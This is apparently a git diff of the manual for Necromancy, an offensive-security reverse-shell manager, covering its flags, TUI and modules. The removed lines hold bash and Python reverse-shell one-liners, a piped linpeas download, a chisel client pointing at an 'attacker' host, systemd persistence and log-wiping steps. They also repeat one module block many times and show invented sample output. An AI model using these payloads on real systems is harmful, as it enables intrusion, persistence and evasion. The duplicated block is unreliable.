@@ -1,715 +1,539 @@
-# 📚 Necromancy Documentation
+# Necromancy Documentation
 
-## 🎯 Overview
+## Overview
 
-This comprehensive documentation covers all features, tools, and capabilities of Necromancy - the advanced post-exploitation shell manager.
+Necromancy is a Go-based reverse-shell manager with a terminal UI, multi-session handling, payload generation, logging, and a built-in module registry for post-session workflows. This document is the primary product manual for the repository.
 
-## 📖 Table of Contents
+This guide focuses on what the current codebase actually implements. Where behavior is partial, helper-based, or placeholder-driven, that is called out explicitly.
 
-1. [Core Features](#core-features)
-2. [Command Line Interface](#command-line-interface)
-3. [Interactive UI](#interactive-ui)
-4. [File Manager](#file-manager)
-5. [Network Tools](#network-tools)
-6. [Post-Exploitation Modules](#post-exploitation-modules)
-7. [Advanced Features](#advanced-features)
-8. [Configuration](#configuration)
-9. [Troubleshooting](#troubleshooting)
-10. [Security](#security)
+## Table Of Contents
 
-## 🎯 Core Features
+1. [What Necromancy Does](#what-necromancy-does)
+2. [Architecture Summary](#architecture-summary)
+3. [Installation](#installation)
+4. [Runtime Modes](#runtime-modes)
+5. [Command-Line Reference](#command-line-reference)
+6. [Terminal UI Guide](#terminal-ui-guide)
+7. [Sessions And Shell Interaction](#sessions-and-shell-interaction)
+8. [Payloads And Network Awareness](#payloads-and-network-awareness)
+9. [File Transfer And File Manager](#file-transfer-and-file-manager)
+10. [Module System](#module-system)
+11. [Logging And Runtime Files](#logging-and-runtime-files)
+12. [Configuration Notes](#configuration-notes)
+13. [Troubleshooting](#troubleshooting)
+14. [Security And Safe Use](#security-and-safe-use)
+15. [Related Documents](#related-documents)
 
-### Session Management
-- **Multiple Sessions**: Handle unlimited reverse shell connections simultaneously
-- **Session Types**: Support for PTY, Basic, and Bind shell types
-- **Auto-Upgrade**: Automatic shell upgrade to full PTY functionality
-- **Persistence**: Maintain connections across network interruptions
-- **Session Logging**: Optional logging of all session activities
+## What Necromancy Does
 
-### Multi-Platform Support
-- **Linux**: Full support for amd64 and arm64 architectures
-- **macOS**: Native support for both Intel and Apple Silicon
-- **Windows**: Complete Windows support with PowerShell integration
-- **Cross-Platform**: Consistent experience across all platforms
+Necromancy is built around a simple operator workflow:
 
-### Network Capabilities
-- **Multi-Listener**: Listen on multiple ports simultaneously
-- **Bind Shell**: Connect to existing bind shells
-- **HTTP Server**: Built-in file server for quick transfers
-- **Port Forwarding**: Local port forwarding capabilities
-- **Network Discovery**: Automatic network interface detection
+1. Start one or more listeners, or connect to a bind shell.
+2. Wait for a shell to land.
+3. Manage sessions from the TUI.
+4. Interact with the target through raw shell mode or tabbed shell pages.
+5. Use built-in helpers for upload, in-memory execution, pivoting guidance, and modules.
 
-## 🚀 Command Line Interface
+### Current capabilities
 
-### Basic Reverse Shell Workflow
-```mermaid
-graph TD
-    subgraph "Penetration Tester"
-        A[👤 Attacker] -->|"Uses"| B[🧙‍♂️ Necromancy]
-    end
-    
-    subgraph "Target System"
-        C[🖥️ Target] -->|"Connects to"| D[🌐 Listener]
-        E[💻 Shell] -->|"Provides"| F[🔓 Access]
-    end
-    
-    B -->|"Configures"| G[⚙️ Listener Setup]
-    G -->|"Generates"| H[📄 Payloads]
-    H -->|"Executed on"| C
-    C -->|"Establishes"| I[🔗 Reverse Connection]
-    I -->|"Creates"| J[🎯 Interactive Session]
-    J -->|"Enables"| K[🛠️ Post-Exploitation]
-    K -->|"Includes"| L[📁 File Operations]
-    K -->|"Includes"| M[🔍 Module Execution]
-    
-    style A fill:#4CAF50,stroke:#2E7D32,color:#fff
-    style B fill:#9C27B0,stroke:#6A1B9A,color:#fff
-    style C fill:#FF5722,stroke:#D84315,color:#fff
-    style J fill:#2196F3,stroke:#1565C0,color:#fff
-    style K fill:#FFC107,stroke:#F57C00,color:#000
+- Listen on one or many TCP ports.
+- Connect to bind-shell targets instead of listening.
+- Track multiple sessions at the same time.
+- Attempt PTY upgrade automatically for non-Windows sessions.
+- Log session output to per-session files.
+- Show payload templates with automatic IP replacement.
+- Serve files through a built-in HTTP server.
+- Run the app with or without the TUI.
+- Check for updates and download the latest release asset.
+
+### Important product notes
+
+- Necromancy is TUI-first. It is not structured as a typed command shell with built-in commands such as `interact 1` or `kill 1`; those actions are selected from menu pages.
+- Module behavior varies. Some modules dispatch real command sequences, while others are scaffolds, placeholders, or operator helpers.
+- The file manager UI is partially implemented. Navigation and some actions work, but several actions still show placeholder status messages.
+
+## Architecture Summary
+
+```text
+necromancy/
+├── core/       sessions, connection handling, config, logging, network helpers
+├── modules/    built-in post-session modules and file-manager logic
+├── pty/        PTY auto-upgrade behavior
+├── server/     HTTP file server
+├── ui/         tview dashboard, pages, and shell tabs
+├── updater/    release checks and self-update logic
+├── utils/      formatting and network utilities
+└── main.go     entry point and flag parsing
 ```
 
-### Session Management Flow
-```mermaid
-graph LR
-    subgraph "Session Management"
-        A[📊 Session Browser] --> B[🖱️ Select Session]
-        B --> C[🔗 Interactive Shell]
-        C --> D[🛠️ Post-Exploitation Tools]
-    end
-    
-    subgraph "Available Tools"
-        D --> E[📁 File Manager]
-        D --> F[🔍 Module Browser]
-        D --> G[⚙️ System Tools]
-        D --> H[📡 Network Tools]
-    end
-    
-    subgraph "Session Operations"
-        I[📝 Session Logs] --> A
-        J[🔒 Session Security] --> A
-        K[⏰ Session Timing] --> A
-    end
-    
-    style A fill:#2196F3,stroke:#1565C0,color:#fff
-    style C fill:#4CAF50,stroke:#2E7D32,color:#fff
-    style D fill:#FF9800,stroke:#F57C00,color:#000
-    style E fill:#9C27B0,stroke:#6A1B9A,color:#fff
-    style F fill:#E91E63,stroke:#C2185B,color:#fff
-```
+### Main components
 
-### Basic Usage
+| Path | Purpose |
+| --- | --- |
+| `main.go` | Startup, flag parsing, listener setup, bind-shell mode, headless mode |
+| `core/` | Session manager, OS detection, logs, listeners, config |
+| `ui/` | Menu pages, session actions, payload page, shell tabs |
+| `modules/` | Module registry, file-manager logic, file-transfer helpers, monitoring helpers |
+| `server/` | Built-in HTTP file server for quick staging |
+| `updater/` | GitHub release check and binary self-update |
+
+## Installation
+
+### Download a release
+
+Use the latest asset from GitHub Releases.
 
 ```bash
-# Start listener on default port (4444)
+# Linux amd64
+curl -LO https://github.com/Aryma-f4/necromancy/releases/latest/download/necromancy-linux-amd64
+chmod +x necromancy-linux-amd64
+./necromancy-linux-amd64
+```
+
+### Install with Go
+
+```bash
+go install github.com/Aryma-f4/necromancy@latest
+```
+
+### Build locally
+
+```bash
+git clone https://github.com/Aryma-f4/necromancy.git
+cd necromancy
+go build -o necromancy .
+./necromancy
+```
+
+### Multi-platform build script
+
+The repository also includes helper scripts:
+
+- `build.sh`
+- `build-multi-platform.sh`
+- `Makefile`
+
+## Runtime Modes
+
+### Reverse-shell listener mode
+
+Default mode starts one or more listeners.
+
+```bash
+./necromancy
+./necromancy -p 4444,4445,4446
+./necromancy -p 8080 -i 0.0.0.0
+```
+
+### Bind-shell client mode
+
+Provide `-c` to connect outward instead of listening.
+
+```bash
+./necromancy -c target.example -p 4444
+```
+
+If multiple ports are provided, the application attempts to connect to the same host on each configured port.
+
+### HTTP file-server mode
+
+Provide a directory with `-s`.
+
+```bash
+./necromancy -p 4444 -s ./payloads -w 8000
+./necromancy -p 4444 -s ./payloads -w 8000 --prefix /static
+```
+
+### Headless mode
+
+Headless mode skips the TUI and keeps the listeners running in non-interactive environments.
+
+```bash
+./necromancy --headless
+```
+
+Useful for:
+
+- VPS environments
+- `tmux` or `screen`
+- service wrappers
+- `nohup` usage
+- CI or automation labs
+
+### Update mode
+
+```bash
+./necromancy --check-update
+./necromancy --update
+```
+
+`--update` checks GitHub Releases, downloads the platform-matching binary, and replaces the current executable.
+
+## Command-Line Reference
+
+### Flag table
+
+| Flag | Type | Default | Description | Notes |
+| --- | --- | --- | --- | --- |
+| `-p` | string | `4444` | Comma-separated ports | Core listener option |
+| `-s` | string | empty | Serve a directory over HTTP | Enables file server |
+| `-i` | string | `0.0.0.0` | Interface or local IP to bind | Also affects listener address display |
+| `-c` | string | empty | Bind-shell host | Switches app into connect mode |
+| `-m` | int | `0` | Maintain at least `N` sessions | Uses the first active session to attempt respawn logic |
+| `-L` | bool | `false` | Disable session log files | Does not disable `necromancy-go.log` |
+| `-U` | bool | `false` | Disable PTY auto-upgrade | Mainly affects shell usability on Unix-like targets |
+| `-O` | bool | `false` | Enable OSCP-safe mode | Flag exists; current code does not add extra behavior yet |
+| `-w` | int | `8000` | HTTP server port | Used with `-s` |
+| `-S` | bool | `false` | Accept only the first created session | Later incoming connections are rejected |
+| `-C` | bool | `false` | Do not auto-attach on new sessions | Flag exists; current code path is not wired to additional behavior yet |
+| `--prefix` | string | empty | URL prefix for file serving | Example: `/static` |
+| `-a`, `--payloads` | bool | `false` | Print payloads and exit | Uses first configured port |
+| `-l`, `--interfaces` | bool | `false` | Print interfaces and exit | Convenience output |
+| `-v`, `--version` | bool | `false` | Print version and exit | Does not start listeners |
+| `--headless` | bool | `false` | Disable TUI | Best for non-interactive shells |
+| `--check-update` | bool | `false` | Check for a newer release | Read-only action |
+| `--update` | bool | `false` | Download and replace current binary | Modifies current executable |
+
+### Example commands
+
+```bash
+# Default listener
 ./necromancy
 
-# Custom port configuration
-./necromancy -p 8080
-./necromancy -p 4444,4445,4446
+# Multiple listeners
+./necromancy -p 4444,5555,6666
 
-# Connect to bind shell
-./necromancy -c target.com -p 4444
+# File server with URL prefix
+./necromancy -s ./loot -w 8080 --prefix /share
 
-# With HTTP file server
-./necromancy -p 4444 -s /path/to/files -w 8000
+# Single-session mode
+./necromancy -p 4444 -S
+
+# Show payloads only
+./necromancy --payloads -p 9001
 ```
 
-### Command Line Options
+## Terminal UI Guide
 
-| Option | Short | Description | Default |
-|--------|--------|-------------|---------|
-| `--ports` | `-p` | Port(s) to listen on | 4444 |
-| `--serve` | `-s` | Directory to serve via HTTP | - |
-| `--web-port` | `-w` | HTTP server port | 8000 |
-| `--interface` | `-i` | Local interface to bind | 0.0.0.0 |
-| `--connect` | `-c` | Connect to bind shell host | - |
-| `--maintain` | `-m` | Keep N sessions per target | 0 |
-| `--no-log` | `-L` | Disable session log files | false |
-| `--no-upgrade` | `-U` | Disable shell auto-upgrade | false |
-| `--help` | `-h` | Show help message | - |
+The TUI is built with `tview` and centers the workflow around pages rather than typed subcommands.
 
-### Quick Commands
+### Main dashboard
+
+The root menu contains:
+
+- `Sessions`: active reverse shells and per-session actions
+- `Payloads`: payload preview, copy, and refresh
+- `Modules`: browse the module catalog without selecting a session
+- `Network Info`: current local/public IP information and configured ports
+- `Interfaces`: local interface overview
+- `Exit`: stop the UI
+
+### Navigation basics
+
+- Arrow keys move through lists.
+- `Enter` opens the selected page or action.
+- `Esc` returns to the previous page.
+- Mouse support is enabled in the TUI, except on the payload page where mouse selection is intentionally freed for terminal copy behavior.
+
+## Sessions And Shell Interaction
+
+### Session list
+
+When a listener receives a connection, the session is added to the session list. Each session tracks:
+
+- a numeric ID,
+- remote address,
+- session type,
+- output history,
+- detected operating system,
+- optional log file.
+
+### Session action page
+
+Selecting a session opens the action menu:
+
+- `Shell Tabs`
+- `Raw Interact`
+- `File Manager`
+- `Cancel Commands`
+- `Run Module`
+- `Upload File`
+- `In-Memory Exec`
+- `Port Forwarding`
+- `Kill`
+
+### Raw interact
+
+`Raw Interact` suspends the TUI and hands control to a direct terminal session. If the target is not already marked as PTY-capable and the OS is not Windows, Necromancy attempts an automatic PTY upgrade before interaction.
+
+### Tabbed shell workspace
+
+The shell-tab workspace creates multiple local tabs that all mirror the same remote stream. This is useful for organizing operator notes or keeping separate logical contexts while still driving one shell.
+
+#### Shell-tab shortcuts
+
+| Key | Action |
+| --- | --- |
+| `Ctrl+N` | Create a new tab |
+| `Ctrl+W` | Close the current tab |
+| `Tab` | Next tab |
+| `Shift+Tab` | Previous tab |
+| `Up` | Older command from local tab history |
+| `Down` | Newer command from local tab history |
+| `Esc` | Return to session actions |
+
+### Canceling running commands
+
+The `Cancel Commands` action tries to interrupt foreground work and then sends OS-specific follow-up commands:
+
+- Unix-like targets: attempts `kill -INT` and `kill -KILL` against shell jobs.
+- Windows targets: attempts to stop PowerShell jobs.
+
+## Payloads And Network Awareness
+
+### Payload page behavior
+
+The payload page renders several reverse-shell templates and substitutes `YOUR_IP` using runtime network detection.
+
+Current payload types shown in the UI:
+
+- Bash
+- Python
+- Netcat
+- PowerShell
+- PHP
+- Ruby
+- Perl
+
+### IP selection behavior
+
+Necromancy gathers:
+
+- local IP information,
+- public IP information,
+- configured listening ports.
+
+The UI prefers a non-private public IP when one is available; otherwise it falls back to the local IP.
+
+### Payload-page controls
+
+| Key | Action |
+| --- | --- |
+| `Enter` | Copy the selected payload to clipboard |
+| `c` | Copy the selected payload to clipboard |
+| `r` | Refresh network information |
+| `Esc` | Return to the dashboard |
+
+### CLI payload output
+
+Use the CLI-only payload mode when you just need a quick payload printout:
 
 ```bash
-# Show available payloads
 ./necromancy --payloads
-
-# List network interfaces
-./necromancy -l
-
-# Show version
-./necromancy --version
+./necromancy --payloads -p 8080
 ```
 
-## 🎮 Interactive UI
+## File Transfer And File Manager
 
-### Main Menu Navigation
+### Upload and in-memory execution
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    Necromancy Main Menu                    │
-│              Interactive reverse shell manager             │
-├─────────────────────────────────────────────────────────────┤
-│ [s] Sessions      - View and manage active sessions        │
-│ [p] Payloads     - Show reverse shell payloads           │
-│ [m] Modules       - Browse post-exploitation modules       │
-│ [i] Interfaces    - List network interfaces               │
-│ [n] Network Info  - Show network information              │
-│ [q] Quit          - Exit application                    │
-└─────────────────────────────────────────────────────────────┘
-```
+From the session action page, you can:
 
-### Session Management
+- upload a local file to a remote destination,
+- execute a local script in-memory on the target.
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│ Active Sessions (3)                                        │
-├─────────────────────────────────────────────────────────────┤
-│ ID │ Host            │ Port │ Type  │ Status │ Duration  │
-│────┼─────────────────┼──────┼───────┼────────┼───────────│
-│ 1  │ 192.168.1.100   │ 4444 │ PTY   │ Active │ 00:15:23  │
-│ 2  │ 10.0.0.50       │ 4445 │ Basic │ Active │ 00:08:45  │
-│ 3  │ target.com      │ 8080 │ Bind  │ Active │ 00:02:10  │
-└─────────────────────────────────────────────────────────────┘
-```
+These are launched through forms in the TUI.
 
-### Session Commands
+### Built-in HTTP file server
 
-- `interact <ID>` - Connect to specific session
-- `kill <ID>` - Terminate specific session
-- `kill *` - Terminate all sessions
-- `upload <local> <remote>` - Upload file to target
-- `download <remote> <local>` - Download file from target
-
-## 📁 File Manager
-
-### File Manager Interface
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│ File Manager - /home/user/target                         │
-├─────────────────────────────────────────────────────────────┤
-│ Name              │ Size    │ Modified     │ Permissions  │
-│──────────────────┼─────────┼──────────────┼──────────────│
-│ 📁 Documents     │ 4.0 KB  │ 2024-01-15   │ drwxr-xr-x   │
-│ 📁 Downloads     │ 12.5 KB │ 2024-01-14   │ drwxr-xr-x   │
-│ 📄 config.txt    │ 1.2 KB  │ 2024-01-13   │ -rw-r--r--   │
-│ 📄 script.sh     │ 856 B   │ 2024-01-12   │ -rwxr-xr-x   │
-│ 🔗 link.txt      │ 24 B    │ 2024-01-11   │ lrwxrwxrwx   │
-└─────────────────────────────────────────────────────────────┘
-```
-
-### File Manager Commands
-
-#### Navigation
-- `↑/↓` - Navigate files and directories
-- `Enter` - Open directory or execute file
-- `Backspace` - Go to parent directory
-- `r` - Refresh current directory
-
-#### File Operations
-- `d` - Download selected file
-- `u` - Upload file to current directory
-- `x` - Delete selected file/directory
-- `n` - Create new file
-- `m` - Create new directory
-- `e` - Edit selected file
-- `c` - Copy file path
-- `v` - Paste copied file
-
-#### Special Keys
-- `a` - Select all files
-- `h` - Show help
-- `q` - Exit file manager
-- `F12` - Detach from session
-
-## 🌐 Network Tools
-
-### Network Information Display
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│ Network Information                                        │
-├─────────────────────────────────────────────────────────────┤
-│ Local IP: 192.168.1.50                                   │
-│ Public IP: 203.0.113.45                                  │
-│ Location: Jakarta, Indonesia                               │
-│ Provider: Example ISP                                    │
-│                                                            │
-│ Listening Ports:                                          │
-│ - 0.0.0.0:4444 (TCP)                                     │
-│ - 0.0.0.0:4445 (TCP)                                     │
-│ - 0.0.0.0:8000 (HTTP)                                    │
-└─────────────────────────────────────────────────────────────┘
-```
-
-### Payload Updates Feature
-
-The **Payload Updates** feature automatically updates generated payloads with real network information:
-
-1. **IP Detection**: Automatically detects local and public IP addresses
-2. **Port Configuration**: Uses configured listening ports instead of defaults
-3. **Template Replacement**: Replaces `YOUR_IP` with actual IP addresses
-4. **Multi-IP Support**: Prefers public IP when available, falls back to local IP
-5. **Real-time Updates**: Payloads refresh when network information changes
-
-Example of payload update process:
-```bash
-# Before update:
-bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
-
-# After update (with public IP):
-bash -i >& /dev/tcp/203.0.113.45/4444 0>&1
-
-# After update (with local IP only):
-bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
-```
-
-### Payload Generator
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│ Available Reverse Shell Payloads                          │
-├─────────────────────────────────────────────────────────────┤
-│ [1] Bash         - Classic bash TCP reverse shell          │
-│ [2] Python       - Python reverse shell with PTY         │
-│ [3] Netcat       - Netcat traditional reverse shell       │
-│ [4] PowerShell   - Windows PowerShell reverse shell      │
-│ [5] PHP          - PHP reverse shell                    │
-│ [6] Ruby         - Ruby reverse shell                    │
-│ [7] Perl         - Perl reverse shell                    │
-│                                                            │
-│ Press number to copy, 'r' to refresh, 'q' to quit       │
-└─────────────────────────────────────────────────────────────┘
-```
-
-### Payload Examples with IP Updates
-
-#### Before IP Detection (Template):
-```bash
-# Template payload (shows YOUR_IP placeholder)
-bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
-
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
-```
-
-#### After IP Detection (Actual IPs):
-```bash
-# With public IP detected
-bash -i >& /dev/tcp/203.0.113.45/4444 0>&1
-
-# With local IP only
-bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
-
-# With custom port
-bash -i >& /dev/tcp/203.0.113.45/8080 0>&1
-```
-
-#### Payload Update Process:
-1. **Network Detection**: System detects local and public IP addresses
-2. **IP Selection**: Prefers public IP when available, falls back to local IP
-3. **Port Configuration**: Uses configured listening ports (default 4444 or custom)
-4. **Template Replacement**: Replaces `YOUR_IP` with actual IP address
-5. **Real-time Updates**: Payloads refresh when network info changes
-
-#### Supported Payload Types:
-- **🐚 Bash**: Traditional bash reverse shell
-- **🐍 Python**: Python with PTY support for full TTY
-- **🕸️ Netcat**: FIFO-based netcat reverse shell
-- **💎 PowerShell**: Windows PowerShell reverse shell
-- **🐘 PHP**: PHP reverse shell for web servers
-- **💎 Ruby**: Ruby reverse shell
-- **🐪 Perl**: Perl reverse shell
-
-## 🛠️ Post-Exploitation Modules
-
-### Available Modules
-
-| Module | Description | Platform | Category |
-|--------|-------------|----------|----------|
-| **PEASS** | Privilege escalation awesome scripts suite | Linux/Windows | 🎯 Enumeration |
-| **RedSun** | Windows vulnerability enumeration from RedSun | Windows | 🎯 Enumeration |
-| **BlueHammer** | Windows exploitation toolkit from BlueHammer | Windows | ⚡ Exploitation |
-| **Linux Exploit Suggester** | Automated exploit recommendations | Linux | ⚡ Exploitation |
-| **LSE** | Linux smart enumeration tool | Linux | 🎯 Enumeration |
-| **Potato Exploits** | Windows privilege escalation methods | Windows | 🔑 Privilege Escalation |
-| **Chisel** | Fast TCP/UDP tunnel over HTTP | Multi | 🚇 Tunneling |
-| **Ligolo** | Reverse proxy for penetration testing | Multi | 🚇 Tunneling |
-| **Ngrok** | Secure tunnel to localhost | Multi | 🚇 Tunneling |
-| **Meterpreter** | Upgrade to Metasploit sessions | Multi | 🚀 Session Upgrade |
-| **Cleanup** | Remove tracks and artifacts | Multi | 🧹 Cleanup |
-| **Traitor** | Automated Linux privilege escalation | Linux | 🔑 Privilege Escalation |
-| **UAC Bypass** | Windows UAC bypass techniques | Windows | 🔑 Privilege Escalation |
-| **Panix** | Linux persistence via systemd | Linux | 🕰️ Persistence |
-| **Memory Dump** | Process memory analysis | Linux | 🧠 Forensics |
-
-### Module Usage
+If you start Necromancy with `-s`, the application serves the chosen directory over HTTP. This is useful for quick staging and download workflows.
 
 ```bash
-# List all modules
-> m
-
-# Execute specific module
-> m peass
-
-# Get module help
-> m help peass
+./necromancy -p 4444 -s ./payloads -w 8000
 ```
 
-### Module Categories and Examples
-
-#### 🎯 Enumeration Modules
-- **PEASS**: Comprehensive privilege escalation enumeration
-- **LSE**: Linux Smart Enumeration for detailed system analysis
-- **Linux Exploit Suggester**: Automated exploit recommendations based on system version
-
-#### 🔑 Privilege Escalation Modules
-- **Potato Exploits**: Windows privilege escalation (RottenPotato, JuicyPotato, SweetPotato)
-- **Traitor**: Automated Linux privilege escalation
-- **UAC Bypass**: Windows User Account Control bypass techniques
-
-#### 🚇 Tunneling and Pivoting Modules
-- **Chisel**: Fast TCP/UDP tunnel over HTTP
-- **Ligolo**: Advanced reverse proxy for penetration testing
-- **Ngrok**: Secure tunnel to localhost for external access
-
-#### 🚀 Session Upgrade Modules
-- **Meterpreter**: Upgrade to Metasploit sessions for advanced post-exploitation
-
-#### 🧹 Cleanup and Persistence Modules
-- **Cleanup**: Remove logs, history, and artifacts from target system
-- **Panix**: Linux persistence via systemd services
-
-#### 🌞 **RedSun & 🔨 BlueHammer Modules**
-- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
-  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
-  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
-- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
-  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
-  - **🛡️ Windows Defenses**: Bypasses security mechanisms
-
-#### 🌞 **RedSun & 🔨 BlueHammer Modules**
-- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
-  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
-  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
-- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
-  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
-  - **🛡️ Windows Defenses**: Bypasses security mechanisms
-
-#### 🌞 **RedSun & 🔨 BlueHammer Modules**
-- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
-  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
-  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
-- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
-  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
-  - **🛡️ Windows Defenses**: Bypasses security mechanisms
-
-#### 🌞 **RedSun & 🔨 BlueHammer Modules**
-- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
-  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
-  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
-- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
-  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
-  - **🛡️ Windows Defenses**: Bypasses security mechanisms
-
-#### 🌞 **RedSun & 🔨 BlueHammer Modules**
-- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
-  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
-  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
-- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
-  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
-  - **🛡️ Windows Defenses**: Bypasses security mechanisms
-
-#### 🌞 **RedSun & 🔨 BlueHammer Modules**
-- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
-  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
-  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
-- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
-  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
-  - **🛡️ Windows Defenses**: Bypasses security mechanisms
-
-#### 🌞 **RedSun & 🔨 BlueHammer Modules**
-- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
-  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
-  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
-- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
-  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
-  - **🛡️ Windows Defenses**: Bypasses security mechanisms
-
-#### 🌞 **RedSun & 🔨 BlueHammer Modules**
-- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
-  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
-  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
-- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
-  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
-  - **🛡️ Windows Defenses**: Bypasses security mechanisms
-
-#### 🧠 **Forensics & Analysis Modules**
-- **🧠 Memory Dump**: Analyzes and extracts process memory for investigation
-- **📊 System Info**: Collects comprehensive target intelligence
-
-#### 🌞 **RedSun & 🔨 BlueHammer Modules**
-- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
-  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
-  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
-- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
-  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
-  - **🛡️ Windows Defenses**: Bypasses security mechanisms
-
-#### 🌞 **RedSun & 🔨 BlueHammer Modules**
-- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
-  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
-  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
-- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
-  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
-  - **🛡️ Windows Defenses**: Bypasses security mechanisms
-
-### Detailed Module Examples
-
-#### PEASS (Privilege Escalation Awesome Scripts Suite)
-```bash
-# Run PEASS on Linux target
-> m peass
-# This executes: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
-
-# Run PEASS on Windows target  
-> m peass
-# This executes: iwr -useb https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winpeas.exe; .\winpeas.exe
-```
-
-#### Linux Exploit Suggester
-```bash
-# Run exploit suggester
-> m linux_exploit_suggester
-# This analyzes kernel version and suggests applicable exploits
-# Output: [+] Possible Exploits: dirtycow, privilege_escalation_1, etc.
-```
-
-#### Potato Exploits (Windows)
-```bash
-# Run potato exploits
-> m potato
-# This tests various potato exploits: RottenPotato, JuicyPotato, SweetPotato
-# Output: [+] Testing JuicyPotato... [+] Success! SYSTEM privileges obtained
-```
-
-#### Tunneling Tools
-```bash
-# Setup Chisel tunnel
-> m chisel
-# This sets up: chisel server -p 8080 --reverse
-# Then on target: chisel client http://attacker:8080 R:socks
-
-# Setup Ngrok tunnel
-> m ngrok
-# This configures ngrok for secure external access
-```
-
-#### Memory Analysis
-```bash
-# Dump process memory
-> m memory_dump
-# This creates memory dump of critical processes for analysis
-# Output: [+] Memory dump saved to /tmp/memory_dump_[pid].dmp
-```
-
-#### Persistence (Panix)
-```bash
-# Setup systemd persistence
-> m panix
-# This creates systemd service for persistence
-# Service: /etc/systemd/system/evil.service
-# Command: systemctl enable evil.service
-```
-
-#### Cleanup
-```bash
-# Remove traces
-> m cleanup
-# This removes: logs, history, temp files, artifacts
-# Actions: clear logs, remove temp files, clear history
-```
-
-## ⚙️ Advanced Features
-
-### Session Persistence
-
-```bash
-# Configure session persistence
-./necromancy -p 4444 -m 3
-
-# This will maintain 3 sessions per target
-# Automatically spawns new sessions if count drops below 3
-```
-
-### Port Forwarding
-
-```bash
-# Forward local port to remote target
-> forward 8080 192.168.1.100:80
-
-# List active forwards
-> forwards
-
-# Remove forward
-> unforward 8080
-```
-
-### Session Logging
-
-```bash
-# Enable session logging
-./necromancy -p 4444
-
-# Logs are saved to:
-# logs/session_1_192.168.1.100_4444.log
-# logs/session_2_10.0.0.50_4445.log
-```
-
-### Custom Payloads
-
-```bash
-# Create custom payload directory
-mkdir -p ~/.necromancy/payloads
-
-# Add custom payload file
-cat > ~/.necromancy/payloads/custom.sh << 'EOF'
-#!/bin/bash
-# Custom reverse shell payload
-bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
-EOF
-```
-
-## 🔧 Configuration
-
-### Configuration Files
-
-```bash
-# Global configuration
-~/.necromancy/config.yaml
-
-# Module configurations
-~/.necromancy/modules/
-
-# Custom payloads
-~/.necromancy/payloads/
-
-# Session logs
-~/.necromancy/logs/
-```
-
-### Environment Variables
-
-```bash
-# Set default ports
-export NECROMANCY_PORTS="4444,4445,4446"
-
-# Set default interface
-export NECROMANCY_INTERFACE="0.0.0.0"
-
-# Disable auto-upgrade
-export NECROMANCY_NO_UPGRADE="true"
-
-# Disable logging
-export NECROMANCY_NO_LOG="true"
-```
-
-## 🐛 Troubleshooting
-
-### Common Issues
-
